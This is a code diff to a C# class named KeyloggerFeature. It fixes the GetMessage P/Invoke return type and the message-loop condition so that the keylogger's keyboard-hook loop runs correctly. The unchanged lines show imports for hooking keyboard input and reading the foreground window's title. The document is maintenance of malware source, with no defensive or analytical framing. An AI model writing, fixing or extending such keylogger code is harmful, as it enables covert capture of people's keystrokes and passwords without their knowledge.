@@ -11,7 +11,7 @@ internal static class KeyloggerFeature
     [DllImport("user32.dll")] private static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);
     [DllImport("user32.dll")] private static extern nint GetForegroundWindow();
     [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int GetWindowText(nint hWnd, StringBuilder sb, int cch);
-    [DllImport("user32.dll")] private static extern bool GetMessage(out MSG msg, nint hWnd, uint min, uint max);
+    [DllImport("user32.dll")] private static extern int GetMessage(out MSG msg, nint hWnd, uint min, uint max);
     [DllImport("user32.dll")] private static extern bool TranslateMessage(ref MSG msg);
     [DllImport("user32.dll")] private static extern nint DispatchMessage(ref MSG msg);
     [DllImport("user32.dll")] private static extern bool PostThreadMessage(uint tid, uint msg, nint wp, nint lp);
@@ -173,7 +173,7 @@ internal static class KeyloggerFeature
 
         if (_hook == nint.Zero) { _running = false; return; }
 
-        while (_running && GetMessage(out var msg, nint.Zero, 0, 0))
+        while (_running && GetMessage(out var msg, nint.Zero, 0, 0) > 0)
         {
             if (msg.message == WM_QUIT) break;
             TranslateMessage(ref msg);
